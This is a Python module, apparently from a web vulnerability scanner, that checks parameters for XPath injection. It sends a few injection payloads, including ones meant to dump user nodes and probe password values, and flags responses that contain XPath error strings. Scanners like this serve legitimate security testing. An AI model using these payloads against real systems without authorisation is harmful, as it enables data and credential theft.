
from core.scanner.module import *


class XPath(ParamsScanner):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "XPath Injection",
        "Description": "The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.",
        "Risk": Risk.High,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/643.html"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)


    def GetPayloads(self):
        return [
            "AND '1", "AND('", 
            "search=')] | //user/*[contains(*,'", 
            "search=Har') and contains(../password,'c"
        ]

    def is_vulnerable(self, res) -> Status:
        expected_errors = [
            "SimpleXMLElement::xpath():", "Invalid expression", "evaluation failed",
            "xmlXPathEval:", "SimpleXMLElement", "xpath", "DOMXPath::query()", "Invalid predicate",
            "Warning: DOMXPath", "Warning: SimpleXMLElement", "Invalid expression"
        ]

        for err in expected_errors:
            if err in res.text:
                return Status.Vulnerable

        return Status.NotVulnerable